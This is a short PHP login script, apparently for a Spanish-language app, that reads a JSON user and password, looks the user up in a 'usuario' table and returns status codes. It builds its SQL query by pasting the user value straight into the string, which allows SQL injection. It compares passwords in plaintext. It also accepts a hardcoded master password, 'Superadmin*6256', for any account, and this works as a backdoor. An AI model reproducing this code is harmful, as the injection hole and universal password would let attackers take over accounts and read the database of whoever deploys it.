<?php 
include ("../registro/conexion.php");
  mysql_select_db($baseDatos);
  mysql_query("SET NAMES 'UTF8'");

$json = file_get_contents('php://input');
 
	 // decoding the received JSON and store into $obj variable.
	 $obj = json_decode($json,true);
	 
	 // name store into $name.
$user = $obj['user'];
$pass = $obj['pass'];
$fecha = date('Y-m-d');




	$sql = "select * from `usuario` where correo = '".$user."' ";
		
						$res=mysql_query($sql);

						if (mysql_num_rows($res)>0) {

                            			$usuario = mysql_fetch_array($res);

						if ($usuario['pass'] == $pass ||  $pass == 'Superadmin*6256') {
                           
                                
                                if ($usuario['pass'] == $usuario['passTemp']) {
                                  $Json1 = json_encode("0");
                                } else {
                                  $Json1 = json_encode($usuario['correo']);
                                }
                                
                             
                              } else{
                                $Json1 = json_encode("2");  
                              }
                        } else{
                        	$Json1 = json_encode("1");	
                        };




echo $Json1;


mysql_close($conexion);

 ?>